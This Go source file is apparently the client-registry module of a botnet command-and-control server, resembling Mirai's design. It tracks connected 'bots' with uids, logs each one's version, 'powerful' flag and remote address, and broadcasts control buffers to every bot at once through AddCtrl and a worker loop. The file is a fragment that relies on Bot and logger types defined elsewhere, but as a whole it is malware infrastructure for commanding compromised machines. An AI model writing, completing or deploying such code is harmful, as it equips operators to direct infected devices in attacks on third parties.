package main

import (
	"math/rand"
	"sync"
	"time"
)

type CtrlSend struct {
	buf []byte
}

type ClientList struct {
	uid        int
	count      int
	clients    map[int]*Bot
	addQueue   chan *Bot
	delQueue   chan *Bot
	ctrlQueue  chan *CtrlSend
	totalCount chan int
	cntView    chan int
	cntMutex   *sync.Mutex
}

func NewClientList() *ClientList {
	c := &ClientList{
		0,
		0,
		make(map[int]*Bot),
		make(chan *Bot, 128),
		make(chan *Bot, 128),
		make(chan *CtrlSend),
		make(chan int, 64),
		make(chan int),
		&sync.Mutex{}}

	go c.worker()
	go c.fastCountWorker()
	return c
}

func (c *ClientList) Count() int {
	c.cntMutex.Lock()
	defer c.cntMutex.Unlock()

	c.cntView <- 0
	return <-c.cntView
}

func (c *ClientList) AddClient(b *Bot) {
	c.addQueue <- b
	sp.logger.Notice("Add client %d - %s - %s", b.version, b.powerful, b.conn.RemoteAddr())
}

func (c *ClientList) DelClient(b *Bot) {
	c.delQueue <- b
	sp.logger.Notice("Deleted client %d - %s - %s", b.version, b.powerful, b.conn.RemoteAddr())
}

func (c *ClientList) AddCtrl(buf []byte) {
	ctrl := &CtrlSend{buf}
	c.ctrlQueue <- ctrl
}

func (c *ClientList) fastCountWorker() {
	for {
		select {
		case delta := <-c.totalCount:
			c.count += delta
			break
		case <-c.cntView:
			c.cntView <- c.count
			break
		}
	}
}

func (c *ClientList) worker() {
	rand.Seed(time.Now().UTC().UnixNano())

	for {
		select {
		case add := <-c.addQueue:
			c.totalCount <- 1
			c.uid++
			add.uid = c.uid
			c.clients[add.uid] = add
			break
		case ctrl := <-c.ctrlQueue:
			for _, bot := range c.clients {
				bot.Controler(ctrl.buf)
			}
			break
		case del := <-c.delQueue:
			c.totalCount <- -1
			delete(c.clients, del.uid)
			break
		case <-c.cntView:
			c.cntView <- c.count
			break
		}
	}
}
